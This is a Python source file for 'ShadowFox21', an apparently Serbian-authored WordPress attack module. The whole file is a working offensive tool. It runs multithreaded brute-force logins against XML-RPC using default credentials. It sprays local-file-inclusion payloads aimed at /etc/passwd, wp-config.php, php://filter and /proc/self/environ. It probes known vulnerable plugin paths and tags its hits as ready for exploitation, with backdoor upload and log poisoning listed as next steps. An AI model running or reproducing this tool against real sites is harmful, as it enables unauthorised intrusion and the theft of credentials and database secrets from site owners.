
#!/usr/bin/env python3
"""
ShadowFox21 - WordPress Attack Module
====================================
Specijalizovani modul za WordPress napade:
- XML-RPC brute force
- Local File Inclusion (LFI)
- Plugin vulnerability scanning
"""

import requests
import json
import time
import threading
from urllib.parse import urljoin, urlparse
from datetime import datetime
import re
from queue import Queue
import argparse
from pathlib import Path
import base64
import random
import xml.etree.ElementTree as ET

class WordPressAttacker:
    def __init__(self, input_json, threads=5, delay=1.0):
        self.input_json = input_json
        self.threads = threads
        self.delay = delay
        
        # Attack state
        self.wp_targets = []
        self.xmlrpc_results = []
        self.lfi_results = []
        self.plugin_results = []
        self.vulnerable_endpoints = []
        self.mutations_ready = []
        self.errors = []
        
        # Threading
        self.attack_queue = Queue()
        self.lock = threading.Lock()
        
        # Session setup
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; WordPress Security Scanner)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        # Attack payloads
        self.load_attack_payloads()
        
        print(f"🎯 WordPress Attacker inicijalizovan")
        print(f"⚙️  Threads: {threads}, Delay: {delay}s")

    def load_attack_payloads(self):
        """Učitava WordPress-specific payloads"""
        
        # XML-RPC credentials za brute force
        self.xmlrpc_credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('administrator', 'admin'), ('administrator', 'password'),
            ('root', 'root'), ('root', 'admin'), ('root', 'password'),
            ('user', 'user'), ('user', 'password'), ('test', 'test'),
            ('demo', 'demo'), ('guest', 'guest'), ('wp', 'wp'),
            ('wordpress', 'wordpress'), ('wp-admin', 'wp-admin')
        ]
        
        # LFI payloads
        self.lfi_payloads = [
            # Basic LFI
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../wp-config.php',
            '../../wp-config.php',
            '../../../../../etc/passwd',
            
            # PHP filters
            'php://filter/convert.base64-encode/resource=../wp-config.php',
            'php://filter/convert.base64-encode/resource=../../wp-config.php',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=convert.base64-encode/resource=wp-config.php',
            
            # WordPress specific
            '../wp-content/debug.log',
            '../../wp-content/debug.log',
            '../wp-includes/version.php',
            '../../wp-includes/version.php',
            '../wp-admin/admin.php',
            
            # Log files
            '../../../var/log/apache2/access.log',
            '../../../var/log/apache2/error.log',
            '../../../var/log/nginx/access.log',
            '../../../var/log/nginx/error.log',
            
            # Common vulnerable paths
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline'
        ]
        
        # Poznati vulnerabilni plugini
        self.vulnerable_plugins = {
            'wp-file-manager': [
                '/wp-content/plugins/wp-file-manager/lib/files/connector.minimal.php',
                '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
            ],
            'duplicator': [
                '/wp-content/plugins/duplicator/installer/dup-installer/main.installer.php'
            ],
            'ultimate-member': [
                '/wp-content/plugins/ultimate-member/includes/core/um-actions-register.php'
            ],
            'wp-gdpr-compliance': [
                '/wp-content/plugins/wp-gdpr-compliance/wp-gdpr-compliance.php'
            ],
            'wp-support-plus-responsive-ticket-system': [
                '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php'
            ],
            'easy-wp-smtp': [
                '/wp-content/plugins/easy-wp-smtp/connect.php'
            ],
            'formidable': [
                '/wp-content/plugins/formidable/classes/views/frm-fields/back-end/input.php'
            ],
            'wp-statistics': [
                '/wp-content/plugins/wp-statistics/assets/log/log.txt'
            ]
        }
        
        print(f"📦 Loaded payloads:")
        print(f"   • XML-RPC credentials: {len(self.xmlrpc_credentials)}")
        print(f"   • LFI payloads: {len(self.lfi_payloads)}")
        print(f"   • Plugin checks: {len(self.vulnerable_plugins)}")

    def load_recon_data(self):
        """Učitava podatke iz recon JSON fajla"""
        try:
            with open(self.input_json, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"📂 Učitani recon podaci iz: {self.input_json}")
            return data
        except Exception as e:
            print(f"❌ Greška pri učitavanju: {e}")
            return None

    def identify_wordpress_targets(self, recon_data):
        """Identifikuje WordPress sajtove iz bilo kog izvora"""
        wp_sites = []
        all_urls = set()

    # 🧠 Izvuci URL-ove iz standardnog recon formata
        results = recon_data.get('results', {})
        urls = results.get('urls', [])
        for url in urls:
            all_urls.add(url)

    # 🧠 Takođe izvuci URL-ove iz vulnerability skena
        for group in recon_data.get('vulnerabilities_by_severity', {}).values():
            for vuln in group:
                if 'url' in vuln:
                    all_urls.add(vuln['url'])

    # 🧠 Ako postoji all_vulnerabilities, i iz toga izvuci
        for vuln in recon_data.get('all_vulnerabilities', []):
            if 'url' in vuln:
                all_urls.add(vuln['url'])

    # 🧠 Detekcija WP na osnovu indikatora u URL-u
        wp_indicators = ['wp-content', 'wp-admin', 'wp-includes', 'wp-login', 'wordpress']
        for url in all_urls:
            if any(ind in url.lower() for ind in wp_indicators):
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                wp_sites.append({
                    'base_url': base_url,
                    'wp_paths_found': [url]
                })

        print(f"📦 Pronađeno WordPress sajtova: {len(wp_sites)}")
        return wp_sites


    def test_xmlrpc_brute_force(self, wp_site):
        """Testira XML-RPC brute force napad"""
        xmlrpc_url = urljoin(wp_site['base_url'], '/xmlrpc.php')
        results = {
            'url': xmlrpc_url,
            'accessible': False,
            'methods_allowed': [],
            'brute_force_results': [],
            'vulnerability_found': False
        }
        
        try:
            # Provera da li je XML-RPC dostupno
            response = self.session.get(xmlrpc_url, timeout=10)
            if response.status_code == 200 and 'XML-RPC server accepts POST requests only' in response.text:
                results['accessible'] = True
                print(f"✅ XML-RPC accessible: {xmlrpc_url}")
                
                # Testira system.listMethods
                listmethods_xml = '''<?xml version="1.0"?>
                <methodCall>
                    <methodName>system.listMethods</methodName>
                    <params></params>
                </methodCall>'''
                
                methods_response = self.session.post(xmlrpc_url, data=listmethods_xml, 
                                                   headers={'Content-Type': 'text/xml'}, timeout=10)
                
                if methods_response.status_code == 200:
                    # Parsira dostupne metode
                    if 'wp.getUsersBlogs' in methods_response.text:
                        results['methods_allowed'].append('wp.getUsersBlogs')
                    if 'wp.getUsers' in methods_response.text:
                        results['methods_allowed'].append('wp.getUsers')
                
                # Brute force attack
                for username, password in self.xmlrpc_credentials:
                    try:
                        auth_xml = f'''<?xml version="1.0"?>
                        <methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                                <param><value><string>{username}</string></value></param>
                                <param><value><string>{password}</string></value></param>
                            </params>
                        </methodCall>'''
                        
                        auth_response = self.session.post(xmlrpc_url, data=auth_xml,
                                                        headers={'Content-Type': 'text/xml'}, timeout=10)
                        
                        if auth_response.status_code == 200 and 'faultCode' not in auth_response.text:
                            results['brute_force_results'].append({
                                'username': username,
                                'password': password,
                                'status': 'SUCCESS',
                                'response_length': len(auth_response.text)
                            })
                            results['vulnerability_found'] = True
                            print(f"🚨 XML-RPC AUTH SUCCESS: {username}:{password}")
                        else:
                            results['brute_force_results'].append({
                                'username': username,
                                'password': password,
                                'status': 'FAILED'
                            })
                        
                        time.sleep(self.delay)
                        
                    except Exception as e:
                        results['brute_force_results'].append({
                            'username': username,
                            'password': password,
                            'status': 'ERROR',
                            'error': str(e)
                        })
        
        except Exception as e:
            results['error'] = str(e)
        
        return results

    def test_lfi_vulnerabilities(self, wp_site):
        """Testira Local File Inclusion vulnerabilities"""
        results = {
            'base_url': wp_site['base_url'],
            'lfi_tests': [],
            'vulnerable_endpoints': []
        }
        
        # Potencijalni LFI endpointi u WordPress
        lfi_endpoints = [
            '/wp-content/themes/twentytwenty/index.php',
            '/wp-content/themes/twentytwentyone/index.php',
            '/wp-content/plugins/akismet/akismet.php',
            '/wp-admin/admin-ajax.php',
            '/wp-includes/template-loader.php'
        ]
        
        # Dodaje pronađene WP putanje
        lfi_endpoints.extend(wp_site.get('wp_paths_found', []))
        
        for endpoint in lfi_endpoints:
            full_url = urljoin(wp_site['base_url'], endpoint)
            
            for payload in self.lfi_payloads:
                try:
                    # Testira različite parametre
                    test_params = ['file', 'page', 'include', 'path', 'doc', 'template']
                    
                    for param in test_params:
                        test_url = f"{full_url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # LFI indicators
                        lfi_indicators = [
                            'root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:',  # /etc/passwd
                            'define(\'DB_NAME\'', 'define(\'DB_USER\'',     # wp-config.php
                            'WordPress database abstraction object',        # WordPress files
                            '[drivers]', '[fonts]',                       # Windows hosts
                            'GNU/Linux', 'kernel version'                  # /proc/version
                        ]
                        
                        vulnerability_detected = False
                        evidence = []
                        
                        for indicator in lfi_indicators:
                            if indicator in response.text:
                                vulnerability_detected = True
                                evidence.append(indicator)
                        
                        test_result = {
                            'endpoint': full_url,
                            'parameter': param,
                            'payload': payload,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'vulnerable': vulnerability_detected,
                            'evidence': evidence
                        }
                        
                        results['lfi_tests'].append(test_result)
                        
                        if vulnerability_detected:
                            results['vulnerable_endpoints'].append(test_result)
                            print(f"🚨 LFI FOUND: {test_url}")
                        
                        time.sleep(self.delay * 0.5)  # Sporiji za LFI
                        
                except Exception as e:
                    results['lfi_tests'].append({
                        'endpoint': full_url,
                        'payload': payload,
                        'error': str(e)
                    })
        
        return results

    def test_plugin_vulnerabilities(self, wp_site):
        """Testira poznate plugin vulnerabilities"""
        results = {
            'base_url': wp_site['base_url'],
            'plugin_tests': [],
            'vulnerable_plugins': []
        }
        
        for plugin_name, vuln_paths in self.vulnerable_plugins.items():
            for vuln_path in vuln_paths:
                try:
                    test_url = urljoin(wp_site['base_url'], vuln_path)
                    response = self.session.get(test_url, timeout=10)
                    
                    # Plugin vulnerability indicators
                    vuln_indicators = {
                        'wp-file-manager': ['elFinder', 'connector.minimal.php'],
                        'duplicator': ['DUPLICATOR_INSTALLER', 'dup-installer'],
                        'ultimate-member': ['Ultimate Member', 'um-actions'],
                        'wp-gdpr-compliance': ['GDPR Compliance', 'gdpr-compliance'],
                        'wp-support-plus': ['Support Plus', 'downloadAttachment'],
                        'easy-wp-smtp': ['SMTP Settings', 'wp-smtp'],
                        'formidable': ['Formidable', 'frm-fields'],
                        'wp-statistics': ['WP Statistics', 'log.txt']
                    }
                    
                    vulnerability_detected = False
                    evidence = []
                    
                    # Provera za uspešan pristup (200 OK)
                    if response.status_code == 200:
                        # Provera za plugin-specific indikatore
                        indicators = vuln_indicators.get(plugin_name, [])
                        for indicator in indicators:
                            if indicator.lower() in response.text.lower():
                                vulnerability_detected = True
                                evidence.append(indicator)
                        
                        # Dodatne provere za specifične pluginove
                        if plugin_name == 'wp-file-manager' and len(response.text) > 1000:
                            vulnerability_detected = True
                            evidence.append('File manager interface accessible')
                        
                        if plugin_name == 'wp-statistics' and 'log.txt' in vuln_path:
                            vulnerability_detected = True
                            evidence.append('Log file accessible')
                    
                    test_result = {
                        'plugin': plugin_name,
                        'test_url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'vulnerable': vulnerability_detected,
                        'evidence': evidence,
                        'response_preview': response.text[:500] if vulnerability_detected else None
                    }
                    
                    results['plugin_tests'].append(test_result)
                    
                    if vulnerability_detected:
                        results['vulnerable_plugins'].append(test_result)
                        print(f"🚨 PLUGIN VULN: {plugin_name} at {test_url}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    results['plugin_tests'].append({
                        'plugin': plugin_name,
                        'test_url': test_url,
                        'error': str(e)
                    })
        
        return results

    def attack_worker(self):
        """Worker thread za WordPress napade"""
        while True:
            try:
                wp_site, attack_type = self.attack_queue.get(timeout=5)
                
                if attack_type == 'xmlrpc':
                    result = self.test_xmlrpc_brute_force(wp_site)
                    with self.lock:
                        self.xmlrpc_results.append(result)
                        if result.get('vulnerability_found'):
                            self.vulnerable_endpoints.append({
                                'type': 'xmlrpc_bruteforce',
                                'url': result['url'],
                                'credentials': [r for r in result['brute_force_results'] if r['status'] == 'SUCCESS']
                            })
                
                elif attack_type == 'lfi':
                    result = self.test_lfi_vulnerabilities(wp_site)
                    with self.lock:
                        self.lfi_results.append(result)
                        for vuln in result['vulnerable_endpoints']:
                            self.vulnerable_endpoints.append({
                                'type': 'lfi',
                                'endpoint': vuln['endpoint'],
                                'parameter': vuln['parameter'],
                                'payload': vuln['payload']
                            })
                
                elif attack_type == 'plugins':
                    result = self.test_plugin_vulnerabilities(wp_site)
                    with self.lock:
                        self.plugin_results.append(result)
                        for vuln in result['vulnerable_plugins']:
                            self.vulnerable_endpoints.append({
                                'type': 'plugin_vulnerability',
                                'plugin': vuln['plugin'],
                                'url': vuln['test_url']
                            })
                
                self.attack_queue.task_done()
                
            except:
                break

    def run_wordpress_attacks(self):
        """Pokreće sve WordPress napade"""
        print(f"\n🚀 Početak WordPress napada...")
        
        # Učitava recon podatke
        recon_data = self.load_recon_data()
        if not recon_data:
            return False
        
        # Identifikuje WordPress sajtove
        wp_sites = self.identify_wordpress_targets(recon_data)
        if not wp_sites:
            print("❌ Nije pronađen WordPress sajt!")
            return False
        
        start_time = time.time()
        
        # Puni queue sa zadacima
        attack_types = ['xmlrpc', 'lfi', 'plugins']
        for wp_site in wp_sites:
            for attack_type in attack_types:
                self.attack_queue.put((wp_site, attack_type))
        
        total_attacks = len(wp_sites) * len(attack_types)
        print(f"📊 Ukupno napada: {total_attacks}")
        
        # Kreira worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Čeka da se završi
        self.attack_queue.join()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n✅ WordPress napadi završeni za {duration:.2f} sekundi")
        print(f"📊 Rezultati:")
        print(f"   • XML-RPC testova: {len(self.xmlrpc_results)}")
        print(f"   • LFI testova: {len(self.lfi_results)}")
        print(f"   • Plugin testova: {len(self.plugin_results)}")
        print(f"   • Ukupno vulnerabilities: {len(self.vulnerable_endpoints)}")
        
        # Priprema mutations
        self.prepare_mutations()
        
        return True

    def prepare_mutations(self):
        """Priprema podatke za mutations (eksploitacija)"""
        for vuln in self.vulnerable_endpoints:
            mutation_data = {
                'vulnerability_type': vuln['type'],
                'ready_for_exploitation': True,
                'exploitation_difficulty': 'medium',
                'potential_impact': 'high'
            }
            
            if vuln['type'] == 'xmlrpc_bruteforce':
                mutation_data.update({
                    'target_url': vuln['url'],
                    'valid_credentials': vuln['credentials'],
                    'exploitation_method': 'authenticated_access',
                    'next_steps': ['admin_panel_access', 'file_upload', 'code_execution']
                })
            
            elif vuln['type'] == 'lfi':
                mutation_data.update({
                    'target_endpoint': vuln['endpoint'],
                    'vulnerable_parameter': vuln['parameter'],
                    'working_payload': vuln['payload'],
                    'exploitation_method': 'file_inclusion',
                    'next_steps': ['config_file_read', 'log_poisoning', 'rce_attempt']
                })
            
            elif vuln['type'] == 'plugin_vulnerability':
                mutation_data.update({
                    'vulnerable_plugin': vuln['plugin'],
                    'target_url': vuln['url'],
                    'exploitation_method': 'plugin_exploit',
                    'next_steps': ['privilege_escalation', 'backdoor_upload', 'database_access']
                })
            
            self.mutations_ready.append(mutation_data)

    def generate_wordpress_report(self):
        """Generiše JSON izveštaj WordPress napada"""
        report = {
            'module': 'wordpress_attack',
            'attack_info': {
                'timestamp': datetime.now().isoformat(),
                'input_file': self.input_json,
                'threads': self.threads,
                'delay': self.delay
            },
            'statistics': {
                'wordpress_sites_found': len(self.wp_targets),
                'xmlrpc_tests': len(self.xmlrpc_results),
                'lfi_tests': sum(len(r['lfi_tests']) for r in self.lfi_results),
                'plugin_tests': sum(len(r['plugin_tests']) for r in self.plugin_results),
                'total_vulnerabilities': len(self.vulnerable_endpoints),
                'mutations_ready': len(self.mutations_ready)
            },
            'attack_results': {
                'xmlrpc_results': self.xmlrpc_results,
                'lfi_results': self.lfi_results,
                'plugin_results': self.plugin_results
            },
            'vulnerabilities': {
                'summary': self.get_vulnerability_summary(),
                'details': self.vulnerable_endpoints
            },
            'mutations_ready': self.mutations_ready,
            'errors': self.errors
        }
        
        return report

    def get_vulnerability_summary(self):
        """Generiše summary vulnerabilities"""
        summary = {}
        for vuln in self.vulnerable_endpoints:
            vtype = vuln['type']
            if vtype not in summary:
                summary[vtype] = 0
            summary[vtype] += 1
        return summary

    def save_report(self, filename=None):
        """Čuva JSON izveštaj"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"shadowfox_wordpress_attack_{timestamp}.json"
        
        report = self.generate_wordpress_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 WordPress attack izveštaj sačuvan: {filename}")
        return filename

def main():
    parser = argparse.ArgumentParser(description='ShadowFox21 - WordPress Attack Module')
    parser.add_argument('input_json', help='Input JSON file from recon module')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between attacks (default: 1.0)')
    parser.add_argument('-o', '--output', help='Output JSON file')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🎯 ShadowFox21 - WordPress Attack Module")
    print("=" * 60)
    
    # Provera da li input fajl postoji
    if not Path(args.input_json).exists():
        print(f"❌ Input fajl ne postoji: {args.input_json}")
        return
    
    # Kreira WordPress attacker
    attacker = WordPressAttacker(
        input_json=args.input_json,
        threads=args.threads,
        delay=args.delay
    )
    
    try:
        # Pokreće WordPress napade
        if attacker.run_wordpress_attacks():
            # Čuva izveštaj
            attacker.save_report(args.output)
            print(f"\n🎯 WordPress napadi završeni uspešno!")
        else:
            print(f"\n❌ Napadi neuspešni!")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Napadi prekinuti...")
    except Exception as e:
        print(f"\n❌ Greška: {e}")

if __name__ == "__main__":
    main()

